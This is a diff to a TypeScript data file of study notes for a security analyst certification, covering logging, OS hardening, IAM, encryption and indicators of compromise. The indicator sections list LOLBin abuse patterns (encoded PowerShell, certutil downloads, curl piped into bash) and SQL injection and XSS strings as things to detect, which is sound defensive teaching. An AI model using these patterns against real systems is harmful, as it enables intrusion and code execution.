@@ -319,132 +319,190 @@ export interface StudyNote {
 }
 
 export const studyNotes: StudyNote[] = [
+
+
+  // ===================== DOMAIN 1.0 SECURITY OPERATIONS (34%) =====================
   {
     id: "domain-1-1",
-    title: "System & Network Architecture",
+    title: "System and Network Architecture",
     domain: "Domain 1.0",
-    domainName: "System & Network Architecture",
+    domainName: "Security Operations",
     module: "1.1",
     moduleName: "System and Network Architecture",
     description:
-      "Logging, operating systems, Infrastructure Architecture, device management, zero trust, identity and access management, encryption, data protection and critical infrastructure.",
-    lastUpdated: "Oct 9, 2026",
+      "Logging, operating systems, infrastructure architecture, device management, zero trust and SASE, IAM, encryption, data protection and critical infrastructure.",
+    lastUpdated: "2026-10-19",
     access: "Free",
     icon: Network,
-    estimatedTime: "1.4 hours",
+    estimatedTime: "90 minutes",
     sections: [
       {
         heading: "Logging Concepts",
+        explain:
+          "Logs are the evidence trail of every investigation. If the logs are missing, wrong, or untrustworthy, you cannot prove what happened.",
         points: [
-          "Ingestion: The process of collecting logs from devices, applications, and systems and sending them to a central location for monitoring and analysis.",
-          "Configuration: Setting up logging options such as what events to record, log levels, and where logs should be stored.",
-          "Integrity and Security: Ensuring logs cannot be altered, deleted, or accessed by unauthorized users.",
-          "Time Synchronization: Keeping all systems on the same accurate time source so log timestamps can be correlated correctly.",
-          "Retention: Defining how long logs are kept before they are archived or deleted to meet business and compliance requirements.",
+          "Ingestion: Collecting logs from devices, applications, and systems and sending them to a central location (such as a SIEM) for monitoring and analysis.",
+          "Configuration: Choosing what events to record, the log level (for example error vs debug), and where logs are stored. Too little logging hides attacks; too much creates noise and cost.",
+          "Integrity and security: Making sure logs cannot be altered, deleted, or read by unauthorized users. Common controls are forwarding logs to a remote collector, restricting access, and hashing or write-once storage.",
+          "Time synchronization: Keeping all systems on one accurate time source (NTP, usually in UTC) so timestamps from different systems can be lined up into one timeline.",
+          "Retention: How long logs are kept before they are archived or deleted. It is driven by business needs and regulation (for example PCI DSS expects 12 months of history, with the latest 3 months immediately available).",
         ],
         remember:
-          "Think of logs like a security camera system: collect the footage (ingestion), choose what to record (configuration), lock the tapes away (integrity), stamp the right time (time sync), and keep the tapes long enough (retention).",
+          "Logs are a security camera system: collect the footage (ingestion), choose what each camera records (configuration), lock the tapes away (integrity), stamp the correct time on them (time sync), and keep the tapes long enough (retention).",
         examTip:
-          "Match the problem to the keyword. Events out of order or timelines will not line up = time synchronization (NTP). Logs deleted or changed by an attacker = integrity (send logs off-host). Needed for an audit or old investigation = retention.",
+          "Match the PROBLEM to the keyword. Events from two servers will not line up in a timeline = time synchronization (NTP). An attacker cleared the logs on the compromised host and evidence is gone = integrity (the fix is sending logs off-host to a SIEM in real time). Auditor asks for 10-month-old logs and they are deleted = retention. No visibility into what a service did = configuration (the right events were never enabled).",
       },
       {
         heading: "Operating System Concepts",
+        explain:
+          "To spot something abnormal, you must know what normal looks like. This section covers how a hardened OS is set up and which files and processes matter most.",
         points: [
-          "System Hardening: Reducing security risks by disabling unnecessary services, applying patches, and securing configurations.",
-          "File Structure: The way files and directories are organized within an operating system.",
-          "Critical Files: Important system files required for the operating system or applications to function properly.",
-          "System Processes: Running programs and background services that perform tasks within the operating system.",
+          "System hardening: Reducing attack surface by disabling unused services and ports, removing default accounts, applying patches, enforcing least privilege, and following a baseline such as a CIS Benchmark.",
+          "File structure: Windows keeps the OS in C:\\Windows, programs in C:\\Program Files, and user data in C:\\Users. Linux uses one tree starting at / with /etc (configuration), /var/log (logs), /home (users), and /tmp (temporary, writable by everyone).",
+          "Critical files (Windows): the registry, the SAM database (local password hashes), NTDS.dit (all domain password hashes, on domain controllers), and the hosts file (local name resolution).",
+          "Critical files (Linux): /etc/passwd (accounts), /etc/shadow (password hashes), /etc/sudoers (who can run commands as root), /etc/hosts, and ~/.ssh/authorized_keys (keys that can log in without a password).",
+          "System processes: Background programs the OS needs. Windows examples are svchost.exe, lsass.exe (handles logins), winlogon.exe, and explorer.exe. Linux examples are systemd (PID 1), cron (scheduled jobs), and sshd (remote login).",
         ],
         remember:
-          "Think of an OS as a house. Hardening = locking the doors and windows. File structure = the floor plan. Critical files = the safe. Processes = the people inside. You need to know who normally lives there to spot the intruder.",
+          "An OS is a house. Hardening = locking doors and windows. File structure = the floor plan. Critical files = the safe. Processes = the people who live there. You must know who normally lives there to spot the intruder.",
         examTip:
-          "Spot the fake using three checks: wrong name (svch0st.exe), wrong location (a system process running from the Temp folder), or wrong parent (Word launching PowerShell). Any one of these = suspicious.",
+          "Spot a fake process with three checks: wrong NAME (svch0st.exe with a zero), wrong LOCATION (svchost.exe running from C:\\Users\\Public or Temp), or wrong PARENT (winword.exe launching powershell.exe). Any one is suspicious. An unknown program reading lsass.exe memory = credential dumping. A new key added to authorized_keys or a new line in /etc/passwd = persistence. A world-writable /tmp is a normal place for attackers to drop tools.",
       },
       {
-        heading: "Infrastructure/System Architecture Concepts",
+        heading: "Infrastructure and System Architecture Concepts",
+        explain:
+          "Modern systems run in the cloud, in virtual machines, and in containers. Each has different isolation, speed, and security responsibilities.",
         points: [
-          "Cloud Native: Applications designed specifically to run efficiently in cloud environments using cloud services.",
-          "Virtualization: Technology that allows multiple virtual machines to run on a single physical computer.",
-          "Containerization: Packaging applications and their dependencies into lightweight containers for consistent deployment.",
-          "Application Programming Interfaces (APIs): Mechanisms that allow different software applications to communicate and exchange data.",
+          "Cloud native: Applications built for the cloud from the start, often as microservices, containers, or serverless functions. Security follows the shared responsibility model: the provider secures the cloud itself, the customer secures their data, identities, and configuration.",
+          "Virtualization: A hypervisor runs multiple virtual machines (VMs) on one physical host. Each VM has its own full operating system, so isolation is strong. Risks are VM escape (breaking out to the hypervisor) and VM sprawl (forgotten, unpatched VMs).",
+          "Containerization: Applications and their dependencies are packaged into lightweight containers (Docker, orchestrated by Kubernetes). Containers share the host kernel, so they are lighter and faster than VMs but isolated less strongly. Risks are vulnerable images and exposed secrets.",
+          "Application Programming Interfaces (APIs): Mechanisms that let applications exchange data (often REST with JSON). Typical risks are missing authentication, leaked API keys, no rate limiting, and returning more data than needed.",
         ],
         remember:
-          "VM = a separate house with its own foundation (own OS). Container = an apartment in a shared building (shared kernel). Cloud native = built for the cloud from day one. API = the waiter carrying requests between you and the kitchen.",
+          "A VM is a separate house with its own foundation (own OS). A container is an apartment in a shared building (shared kernel). Cloud native = designed for the cloud from day one. An API is a waiter carrying orders between you and the kitchen: if the waiter will serve anybody, anything, anytime, you have a problem.",
         examTip:
-          "Question asks about stronger isolation? Pick VMs. Lighter and faster but shares the kernel? Pick containers. Leaked API key or an API with no authentication? That is an API security problem, so look for answers with strong auth, rate limiting, and an API gateway.",
+          "Stronger isolation = VM. Lighter, faster, and shares the host kernel = container. A leaked API key in a public repo or an API that answers without logging in = API security problem (fixes: strong authentication, rate limiting, API gateway, key rotation). 'Who is responsible for patching the guest OS in IaaS' = the customer; in SaaS = the provider.",
       },
       {
         heading: "Device Management Concepts",
+        explain:
+          "Organizations must control both mobile devices and traditional endpoints. Management (setting the rules) is different from detection (watching for attacks).",
         points: [
-          "Mobile: Managing and securing smartphones, tablets, and other portable devices used by an organization.",
-          "Endpoint: Any device connected to a network, such as laptops, desktops, servers, or mobile devices, that requires protection.",
+          "Mobile: Managing smartphones and tablets with Mobile Device Management (MDM) or Unified Endpoint Management (UEM). Typical controls are enforced passcodes, encryption, app restrictions, containerized work data, and remote lock or wipe. Ownership models include BYOD (personal device) and COPE (company-owned, personally enabled).",
+          "Endpoint: Any laptop, desktop, server, or mobile device on the network. Management covers patching, configuration baselines, application allow-listing, and disk encryption. Protection adds antivirus and EDR (which detects and responds to attacks on the endpoint).",
         ],
         remember:
-          "Phones = MDM (manage them: lock, encrypt, wipe). Computers = EDR (watch them: detect, isolate). Mobile gets MDM, endpoints get EDR.",
+          "MDM is the rulebook and remote control for the phone (lock it, encrypt it, wipe it). EDR is the bodyguard on the laptop (watch behavior, isolate it). Management sets the rules; EDR watches for rule-breakers.",
         examTip:
-          "Lost or stolen phone = remote wipe through MDM. Suspicious behavior on a laptop or server = use EDR to investigate and isolate the host.",
+          "Lost or stolen phone = remote wipe through MDM. Employees use personal phones for work and the company wants to separate work data = BYOD with a managed container. Suspicious behavior on a laptop or server and you need to isolate it = EDR. 'Only approved programs may run' = application allow-listing. Do not pick EDR for 'enforce a passcode policy'; that is MDM or UEM.",
       },
       {
         heading: "Network Architecture Concepts",
+        explain:
+          "Network design decides how far an attacker can move after getting in. Modern designs stop trusting the network location and verify every request.",
         points: [
-          "Zero Trust Network Architecture (ZTNA): A security model that assumes no user or device is trusted by default and requires continuous verification.",
-          "Secure Access Service Edge (SASE): A cloud-based architecture that combines networking and security services into a single platform.",
-          "Hybrid Cloud: An environment that combines on-premises infrastructure with public and/or private cloud services.",
+          "Zero Trust Network Architecture (ZTNA): No user or device is trusted by default, even inside the network. Every request is verified using identity, device health, and context, and access is limited to what is needed. Microsegmentation is a common technique. The CompTIA acronym list also expands ZTNA as Zero Trust Network Access.",
+          "Secure Access Service Edge (SASE): A cloud-delivered service that combines networking (SD-WAN) with security functions such as a secure web gateway (SWG), cloud access security broker (CASB), firewall as a service (FWaaS), and ZTNA. It gives remote users and branch offices the same protection everywhere.",
+          "Hybrid cloud: A mix of on-premises infrastructure and public and/or private cloud. Security challenges are consistent policy, visibility across both, and secure connections between them.",
+          "Segmentation and SDN: Segmentation splits a network into zones so a breach cannot spread freely. Software-Defined Networking (SDN) separates the control plane from the data plane so network rules can be changed centrally by software.",
         ],
         remember:
-          "Zero Trust = a guard checks your ID at every door, not just the front gate. SASE = networking and security delivered from the cloud as one package. Hybrid = part of your setup in your own building, part in the cloud.",
+          "Zero Trust is a guard who checks your ID at every door, not just the front gate. SASE is networking and security delivered from the cloud as one package. Hybrid cloud is part of your setup in your own building and part in a rented one.",
         examTip:
-          'Watch for keywords. "Never trust, always verify" or "microsegmentation" = Zero Trust. Remote workers or branch offices needing the same security everywhere = SASE. Mix of data center and cloud = Hybrid Cloud.',
+          "'Never trust, always verify', 'assume breach', or 'microsegmentation' = Zero Trust. Remote workers and branch offices needing identical security without sending traffic back to HQ = SASE. 'Some servers stay in our data center, others run in AWS' = hybrid cloud. Attacker moved laterally from one workstation to a database server = the fix is segmentation.",
       },
       {
-        heading: "Identity and Access Management (IAM)",
+        heading: "Authentication and Authorization Methods",
+        explain:
+          "Authentication proves who you are. Authorization decides what you may do afterward. Many exam questions test whether you can tell them apart.",
         points: [
-          "Privileged Access Management (PAM): Controls and monitors accounts with elevated permissions to reduce the risk of misuse.",
-          "Authentication and Authorization Methods: Authentication verifies a user's identity, while authorization determines what resources they can access.",
-          "Secrets Management: Securely storing and controlling sensitive information such as passwords, API keys, and encryption keys.",
+          "Authentication factors: Something you know (password, PIN), something you have (token, phone, smart card), something you are (fingerprint, face), and somewhere you are (location). Multifactor authentication (MFA) needs two or more DIFFERENT categories.",
+          "Single sign-on (SSO): One login gives access to many applications. It reduces password fatigue but makes the SSO account a high-value target.",
+          "SAML: An XML-based standard that lets an identity provider tell an application that a user has been authenticated. Common for enterprise SSO.",
+          "OAuth 2.0 and OpenID Connect: OAuth is for AUTHORIZATION (an app gets limited access to your data using a token, without your password). OpenID Connect is a layer on top of OAuth that adds AUTHENTICATION (it tells the app who you are).",
+          "Kerberos: A ticket-based authentication protocol used by Active Directory. Related attacks are pass-the-ticket and Kerberoasting.",
+          "Authorization models: Role-based access control (RBAC) gives permissions by job role. Attribute-based access control (ABAC) decides using attributes such as department, device, time, or location. Least privilege means giving only the access needed.",
         ],
         remember:
-          'AuthN = "Who are you?" (prove it). AuthZ = "What can you do?" (your permissions). PAM = a bodyguard for admin accounts. Secrets = kept in a vault, never written in code.',
+          "AuthN = 'Who are you?' (show your passport). AuthZ = 'What are you allowed to do here?' (the visa rules). MFA = two different kinds of proof, such as a passport plus a fingerprint, not two passports.",
         examTip:
-          "Password or API key found in a GitHub repo or script = secrets management (use a vault and rotate the key). Admin account being misused = PAM (just-in-time access, session recording). Logging in is authentication; what you can open afterward is authorization.",
+          "A password plus a security question is NOT MFA (both are 'something you know'). 'Let an app read my calendar without giving it my password' = OAuth. 'Log in once and open all company apps' = SSO (SAML or OpenID Connect). Permissions based on job title = RBAC; based on attributes like time and device = ABAC. Logging in is authentication; what you can open afterward is authorization.",
+      },
+      {
+        heading: "Privileged Access Management and Secrets Management",
+        explain:
+          "Admin accounts and secrets such as passwords and API keys are the most valuable things an attacker can steal, so they need extra protection.",
+        points: [
+          "Privileged Access Management (PAM): Controls and monitors accounts with elevated rights. Common features are a password vault with check-out, just-in-time (temporary) access, session recording, and approval workflows.",
+          "Secrets management: Securely storing, distributing, and rotating secrets such as passwords, API keys, tokens, certificates, and encryption keys in a vault instead of in code or configuration files.",
+          "Common failures: Hard-coded credentials in source code, secrets committed to public repositories, shared admin passwords, and secrets that are never rotated.",
+        ],
+        remember:
+          "PAM is a bodyguard and a logbook for the admin accounts: you must sign for the master key, someone watches you use it, and you hand it back. Secrets belong in a vault, never taped to the code.",
+        examTip:
+          "A password or API key found in a GitHub repository or script = secrets management failure (move it to a vault, rotate the exposed key immediately). An administrator account being misused, or admins who need power only for a short task = PAM with just-in-time access and session recording. Rotating a leaked key is mandatory even after you delete the commit, because it is already in the history.",
       },
       {
         heading: "Encryption Techniques",
+        explain:
+          "Encryption protects confidentiality, hashing protects integrity, and digital signatures prove who sent something. Picking the right one for the need is the skill tested.",
         points: [
-          "Encryption Techniques: Methods used to convert readable data into unreadable ciphertext to protect it from unauthorized access.",
-          "Symmetric encryption uses one shared key for speed (AES).",
-          "Asymmetric encryption uses public and private key pairs (RSA, ECC).",
-          "Hashing creates a one-way fingerprint for integrity (SHA-256).",
+          "Symmetric encryption: One shared key encrypts and decrypts. It is fast and used for large amounts of data (AES). The challenge is sharing the key safely.",
+          "Asymmetric encryption: A public and private key pair. What one key encrypts, only the other decrypts (RSA, ECC). It is slower and used for key exchange and signatures.",
+          "Hashing: A one-way function that produces a fixed-length fingerprint (SHA-256). It cannot be reversed and is used to check integrity. MD5 and SHA-1 are considered weak.",
+          "Digital signature: A hash signed with the sender's private key. Anyone can verify it with the public key, which proves integrity, authenticity, and non-repudiation.",
         ],
         remember:
-          "Symmetric = one key, like a house key you copy for a friend. Asymmetric = a public padlock anyone can snap shut, but only your private key opens it. Hash = a fingerprint, it can never be turned back into the original.",
+          "Symmetric = one key, like a house key you copy for a friend. Asymmetric = a public padlock anyone can snap shut, but only your private key opens it. Hash = a fingerprint: you can compare it, but you can never turn it back into the person.",
         examTip:
-          'Match the need to the type. Encrypt lots of data quickly = symmetric (AES). Exchange keys or sign something = asymmetric (RSA). Prove a file was not changed = hash (SHA-256). If an answer says "decrypt a hash," it is wrong.',
+          "Encrypt lots of data quickly = symmetric (AES). Exchange keys or sign something = asymmetric (RSA, ECC). Prove a file was not changed = hash (SHA-256). Prove WHO sent a message and that it was not altered = digital signature (signed with the PRIVATE key). 'Decrypt a hash' is always a wrong answer. To send a confidential message to Bob, encrypt with Bob's PUBLIC key.",
+      },
+      {
+        heading: "PKI, TLS, and Data States",
+        explain:
+          "Public key infrastructure and TLS make asymmetric encryption usable on the internet. Data must be protected in all three of its states.",
+        points: [
+          "Public Key Infrastructure (PKI): The system of certificate authorities (CAs), digital certificates, and revocation that proves a public key belongs to a specific owner. Revoked certificates are listed in a CRL or checked by OCSP.",
+          "TLS and SSL: TLS secures data in transit (HTTPS). It uses asymmetric encryption to agree on a session key, then symmetric encryption for the data. SSL is the old, insecure predecessor; use TLS 1.2 or 1.3.",
+          "Data at rest: Stored data (disk, database, backup), protected with full-disk or database encryption.",
+          "Data in transit: Data moving across a network, protected with TLS, VPN, or SSH.",
+          "Data in use: Data being processed in memory. It is the hardest to protect and relies on access control and secure enclaves.",
+        ],
+        remember:
+          "PKI is the passport office: a trusted authority vouches that this public key really belongs to this website. TLS is the sealed armored truck for data on the road; disk encryption is the safe for data in the warehouse.",
+        examTip:
+          "Browser shows a certificate warning = expired, self-signed, wrong name, or untrusted CA. Stolen laptop with encrypted disk = data at rest protected. Sniffing on public Wi-Fi defeated by HTTPS = data in transit. A compromised private key means the certificate must be revoked and replaced. Questions about 'SSL' on the exam usually mean the old protocol is the problem; the answer is TLS.",
       },
       {
         heading: "Data Protection Concepts",
+        explain:
+          "You cannot protect data you have not identified. Data protection starts with knowing what data you have and how sensitive it is.",
         points: [
-          "Data Protection Concepts: Strategies and controls used to ensure data confidentiality, integrity, availability, and privacy.",
-          "Classification helps prioritize protection: public, internal, confidential, restricted.",
-          "DLP tools detect and prevent unauthorized data movement.",
-          "Masking and tokenization hide sensitive values from users who should not see them.",
+          "Classification: Labeling data by sensitivity (for example public, internal, confidential, restricted) so stronger controls go to more sensitive data. It includes Personally Identifiable Information (PII).",
+          "Data Loss Prevention (DLP): Tools that detect and block sensitive data leaving through email, USB, cloud uploads, or printing.",
+          "Masking: Hiding part of a value (for example ****-****-****-1234) so users see only what they need.",
+          "Tokenization: Replacing a sensitive value with a random stand-in token. The real value is stored in a separate secure vault.",
+          "Backups and availability: Regular tested backups protect against ransomware and failure. Data protection covers confidentiality, integrity, and availability.",
         ],
         remember:
-          "Label it, lock it, watch it. You cannot protect data you have not classified. Masking = blur the real value. Tokenization = swap it for a harmless stand-in.",
+          "Label it, lock it, watch it. Classification = the label. Encryption and access control = the lock. DLP = the camera at the exit. Masking = blurring the number on the screen. Tokenization = swapping the real card for a casino chip.",
         examTip:
-          "Sensitive data leaving through email, USB, or cloud uploads = DLP. Deciding how strongly to protect something = classification. Developers need realistic test data without exposing real customer values = masking or tokenization.",
+          "Sensitive data leaving by email, USB, or cloud upload = DLP. Deciding how strongly to protect something = classification. Developers need realistic test data without real customer values = masking or tokenization. A payment system that should never store real card numbers = tokenization. Masking changes what is displayed; tokenization changes what is stored.",
       },
       {
         heading: "Critical Infrastructure Concepts",
+        explain:
+          "Power, water, and manufacturing run on specialized systems where a security action can cause physical harm. Safety and uptime come before everything else.",
         points: [
-          "Operational Technology (OT): Hardware and software used to monitor and control physical industrial equipment and processes.",
-          "Industrial Control System (ICS): Systems used to automate and manage industrial operations such as manufacturing and power generation.",
-          "Supervisory Control and Data Acquisition (SCADA): A type of ICS that collects data from remote devices and provides centralized monitoring and control.",
+          "Operational Technology (OT): Hardware and software that monitors and controls physical equipment such as valves, motors, and sensors.",
+          "Industrial Control System (ICS): Systems that automate industrial processes. Typical parts are PLCs (controllers), HMIs (operator screens), and sensors and actuators.",
+          "Supervisory Control and Data Acquisition (SCADA): A type of ICS that collects data from remote sites and gives central monitoring and control (for example a pipeline or power grid).",
+          "Security approach: Segment OT from IT, monitor passively, restrict remote access, and test patches carefully. Many OT devices are legacy, cannot be patched often, and use protocols without authentication (such as Modbus).",
         ],
         remember:
-          "OT is the big umbrella, ICS sits under it, and SCADA is an ICS that watches over remote sites. In OT, safety and uptime beat everything, because a patch that crashes a power plant is worse than a delay.",
+          "OT is the big umbrella, ICS sits under it, and SCADA is an ICS that watches over remote sites. In OT, safety and uptime beat everything: a patch that crashes a power plant is worse than a delay.",
         examTip:
-          "Water, power, or factory scenario? Think availability first. Safe answers: segment OT from IT and monitor passively. Be wary of answers that suggest active scanning, rebooting, or rushing patches on live OT systems.",
+          "Water, power, pipeline, or factory scenario = availability and safety first. Safe answers: segment OT from IT, passive monitoring, strict remote access. Be wary of answers that suggest active scanning, rebooting, or rushing patches on live OT systems. 'Central control of remote field sites' = SCADA. 'Controller running the production line' = PLC.",
       },
     ],
   },
@@ -456,96 +514,152 @@ export const studyNotes: StudyNote[] = [
     module: "1.2",
     moduleName: "Indicators of Malicious Activity",
     description:
-      "Network, host, application, cloud, identity and email indicators, plus social engineering tricks like typosquatting and business email compromise.",
-    lastUpdated: "Oct 9, 2026",
+      "Network, host, application, cloud, identity, and email indicators, plus social engineering such as typosquatting and business email compromise.",
+    lastUpdated: "2026-10-19",
     access: "Free",
     icon: Search,
-    estimatedTime: "1.3 hours",
+    estimatedTime: "85 minutes",
     sections: [
       {
-        heading: "Network-related indicators",
+        heading: "Network-related Indicators",
+        explain:
+          "Attackers must communicate over the network, which leaves traces. Knowing normal traffic is how you spot the abnormal.",
         points: [
-          "Rogue devices: Unauthorized devices connected to the network that could be used to steal data, spread malware, or gain unauthorized access.",
-          "Enumeration: An attacker gathers information about systems, users, ports, or services to identify potential targets and vulnerabilities.",
-          "Anomalous activity: Unusual network behavior, such as unexpected traffic spikes or connections, that may indicate an attack.",
-          "Activity on unexpected ports: Network communication occurring on ports not normally used by the organization, which could indicate malware or unauthorized services.",
+          "Rogue devices: Unauthorized devices on the network (an unknown laptop, a hidden Wi-Fi access point, a Raspberry Pi) that can steal data or give an attacker a foothold.",
+          "Enumeration: Gathering details about targets, such as live hosts, open ports, running services, users, and shares. Port scanning finds what is open; enumeration extracts what is behind it.",
+          "Anomalous activity: Unusual traffic such as sudden spikes, odd hours, new destinations, or beaconing (connections to the same outside address at regular intervals, a sign of command and control).",
+          "Activity on unexpected ports: Traffic on ports the organization does not normally use, or a known protocol on the wrong port (for example SSH on port 443 or DNS tunneling data).",
         ],
         remember:
-          "Think of a burglar casing a neighborhood. Enumeration = knocking on every door and checking every window. Rogue device = a stranger who slipped inside the gate. Unexpected port = a back door nobody knew existed. Knowing your normal traffic is how you spot the abnormal.",
+          "A burglar casing a neighborhood: enumeration = knocking on every door and checking every window. A rogue device = a stranger who slipped inside the gate. An unexpected port = a back door nobody knew existed. Beaconing = the burglar's lookout calling home every 60 seconds.",
         examTip:
-          "Match the clue to the indicator. One host trying many ports or many hosts quickly = enumeration (scanning). An unknown MAC address or device on the network = rogue device. Connections at regular intervals to an outside IP = beaconing (C2). A service running on a strange port (like SSH on 443) = unexpected port activity.",
+          "One host touching many ports, or many hosts in a short time = scanning or enumeration. Unknown MAC address or device on the VLAN = rogue device. Equal-interval connections to an external IP = beaconing (C2). Huge outbound transfer at 3 AM = possible exfiltration. A protocol on a non-standard port (SSH on 443) = evasion or tunneling.",
       },
       {
-        heading: "Host-related indicators",
+        heading: "Host-related Indicators: Resource Use and Unauthorized Software",
+        explain:
+          "Malware has to run on a host, so it consumes resources and installs things. These are often the first visible signs.",
         points: [
-          "Resource consumption: Excessive CPU, memory, disk, or network usage that may indicate malware, cryptomining, or unauthorized processes.",
-          "Unauthorized software: Programs installed without approval that may introduce security risks or malware.",
-          "Anomalous activity: Unusual system behavior such as unexpected crashes, slow performance, or strange user actions that may indicate compromise.",
-          "Suspicious or rogue processes: Unknown or unauthorized processes running on a system that could be malicious or performing unauthorized actions.",
-          "Living Off the Land Binaries (LOLBins) and Scripts: Attackers abuse legitimate system tools such as PowerShell, cmd, or Windows utilities to avoid detection.",
-          "File system changes: Unexpected creation, deletion, modification, or encryption of files that may indicate malware activity.",
-          "Data exfiltration: Unauthorized transfer of sensitive data from a system to an external location controlled by an attacker.",
-          "Unauthorized configuration: Security settings, permissions, or system configurations changed without approval, potentially weakening security controls.",
+          "Resource consumption: Unexplained high CPU, memory, disk, or network use, often from cryptominers, botnet clients, or ransomware.",
+          "Unauthorized software: Programs installed without approval, such as remote access tools, cracked software, or password crackers, which may carry malware or break policy.",
+          "Anomalous activity: Unexpected crashes, slowdowns, new startup items, or users doing things outside their normal pattern.",
         ],
         remember:
-          'Think of a thief who uses the house\'s own tools. LOLBins = a burglar using your own ladder and crowbar, so nothing looks "foreign." Exfiltration = carrying the valuables out the door. Resource spike = the lights and meter running hot when nobody is home.',
+          "Think of a house where the electricity meter is spinning but nobody is home: something is running in the background. Software you did not install is a stranger's furniture in your living room.",
         examTip:
-          "Spot the keyword. Unexplained high CPU with no user activity = cryptominer. PowerShell with -enc or a hidden window, or certutil/mshta/rundll32 used oddly = LOLBins. Mass file renames or new file extensions = ransomware. Large archive created then a big outbound upload = data exfiltration. AV or firewall suddenly turned off = unauthorized configuration.",
+          "Unexplained 100% CPU with no user activity = cryptominer. A remote administration tool nobody approved = unauthorized software (possible persistence). A server suddenly uploading gigabytes = check for exfiltration. First step on an unexplained high-CPU host: identify the process, its location, and its parent.",
       },
       {
-        heading: "Application-related indicators",
+        heading: "Host-related Indicators: Suspicious Processes and LOLBins",
+        explain:
+          "Smart attackers avoid bringing their own tools. They abuse legitimate system programs so nothing looks foreign.",
         points: [
-          "Service disruption: An application becomes unavailable or performs poorly due to attacks such as DoS, malware, or unauthorized changes.",
-          "Anomalous activity: Unexpected application behavior, errors, or transactions that may indicate compromise or abuse.",
+          "Suspicious or rogue processes: Processes with a strange name, wrong location, odd parent, unusual network connections, or no digital signature.",
+          "Living Off the Land Binaries (LOLBins) and scripts: Legitimate tools such as PowerShell, cmd, certutil, mshta, rundll32, wmic, and bash that attackers abuse to download, run, or hide malicious code.",
+          "Telltale usage: powershell -enc (Base64-encoded command), -WindowStyle Hidden, certutil -urlcache (download a file), mshta or rundll32 loading remote content, and curl or wget piped into bash.",
         ],
         remember:
-          "Think of a shop. Service disruption = the doors are jammed shut with customers locked out. Anomalous activity = the cash register doing things nobody told it to do, like odd refunds at 3 AM.",
+          "LOLBins = a burglar using your own ladder and crowbar, so nothing looks foreign. The tool is legitimate; the BEHAVIOR is the clue. Winword starting PowerShell is like a receptionist suddenly cracking the safe.",
         examTip:
-          "App suddenly slow or down, with a flood of requests = DoS. Strange errors, odd database queries, or unexpected input in the logs = injection attempt (SQLi or XSS). A new or unknown account created inside the app, or an unusual spike in API calls = application anomaly, so check the app logs first.",
+          "Do not look for 'malware files'; look for odd behavior of normal tools. PowerShell with -enc and a hidden window = obfuscated, likely malicious. certutil downloading from the internet = LOLBin abuse. Word or Excel as the parent of cmd or PowerShell = macro-based attack. The defense is behavioral detection (EDR, command-line logging), not file hashes.",
       },
       {
-        heading: "Cloud-related indicators",
+        heading: "Host-related Indicators: File Changes, Exfiltration, and Configuration",
+        explain:
+          "Attackers eventually change files, steal data, and weaken protections. These changes are strong evidence of compromise.",
         points: [
-          "Anomalous activity: Unusual cloud actions such as unexpected logins, resource creation, or changes in usage patterns that may indicate compromise.",
-          "Resource compromise: Cloud resources such as virtual machines, storage, or databases being accessed or controlled by unauthorized users.",
+          "File system changes: Unexpected creation, deletion, modification, or encryption of files, such as mass renaming with a new extension, new files in system folders, or changed system binaries.",
+          "Data exfiltration: Unauthorized transfer of data out of the organization, often a large archive (zip, rar) created and then uploaded to an external or cloud location.",
+          "Unauthorized configuration changes: Security settings changed without approval, such as antivirus or firewall disabled, new local administrators, changed registry run keys, or new scheduled tasks.",
         ],
         remember:
-          "Think of a company credit card for the cloud. If someone steals it, you see strange purchases: servers in countries you never use, and a bill that suddenly jumps. The bill and the audit log tell on the thief.",
+          "A thief who first disables the alarm (configuration), then packs the valuables into a box (archive), then carries the box out the door (exfiltration). Mass file renames are the vandal who spray-paints everything on the way out (ransomware).",
         examTip:
-          "Unexpected VMs in a new region plus a huge cost spike = cryptomining on compromised cloud resources. Storage bucket suddenly public = misconfiguration or compromise. Logs showing API calls with leaked access keys from an unusual location = compromised credentials. Look for CloudTrail or activity log evidence.",
+          "Thousands of files renamed to a new extension in minutes = ransomware. Large archive created, then big outbound upload to an unknown IP = exfiltration. Antivirus or logging suddenly disabled = defense evasion (unauthorized configuration). New scheduled task or run-key entry = persistence. Changed critical system file = check integrity with hashes or file integrity monitoring.",
       },
       {
-        heading: "Social engineering attacks",
+        heading: "Application-related Indicators",
+        explain:
+          "Applications are a common target. Indicators show up in app logs, error rates, and unusual transactions.",
         points: [
-          "Typosquatting: Attackers create fake websites or domains with names similar to legitimate ones to trick users into visiting them.",
-          "URL shorteners: Shortened links hide the actual destination and can be used to redirect victims to malicious websites.",
+          "Service disruption: The application becomes slow or unavailable because of denial of service, resource exhaustion, malware, or unauthorized changes.",
+          "Anomalous activity: Unexpected errors, odd queries, unusual input in logs, unknown accounts created in the app, spikes in API calls, or transactions that do not fit normal behavior.",
         ],
         remember:
-          'Typosquatting = a fake shop sign with one letter changed (rnicrosoft = "rn" pretending to be "m"). URL shortener = a wrapped gift box: you cannot see what is inside until you open it. Look before you click.',
+          "A shop: service disruption = the doors are jammed and customers are locked out. Anomalous activity = the cash register doing things nobody told it to do, like odd refunds at 3 AM.",
         examTip:
-          "A domain that is one character off from a real brand = typosquatting. A short link (bit.ly style) in an unexpected email = expand it safely and check the destination before opening. Also check WHOIS: a domain registered only days ago is a red flag.",
+          "App suddenly slow or down with a flood of requests from many sources = DoS. Odd characters in input fields such as ' OR 1=1 or <script> in the logs = injection attempt (SQLi or XSS). New admin account created inside the app, or abnormal API call volume = application anomaly; check the application logs first.",
       },
       {
-        heading: "Identity-based indicators",
+        heading: "Cloud-related Indicators",
+        explain:
+          "Cloud attackers want your resources and your keys. The audit log and the bill are the first places to look.",
         points: [
-          "IAM account compromise: An identity and access management account is taken over by an attacker and used to perform unauthorized actions.",
-          "Unauthorized access: Users gain access to systems, applications, or data they are not permitted to use.",
-          "Impossible travel: The same user account appears to log in from geographically distant locations within an impossible timeframe, indicating possible account compromise.",
+          "Anomalous activity: Unexpected logins, API calls from unusual locations, resources created in regions you never use, or changes to permissions and logging settings.",
+          "Resource compromise: Cloud virtual machines, storage, or databases controlled by an unauthorized party. Examples are cryptomining VMs, a storage bucket made public, or stolen access keys.",
+          "Where to look: Cloud audit logs (for example AWS CloudTrail, Azure Activity Log), billing alerts, and identity logs.",
         ],
         remember:
-          "Impossible travel = you swipe your card in New York, and 10 minutes later it is used in Tokyo. Nobody flies that fast, so one of those swipes is a thief. The same logic applies to logins.",
+          "A stolen company credit card: you notice strange purchases in countries you never use and a bill that suddenly jumps. The audit log is the card statement that tells on the thief.",
         examTip:
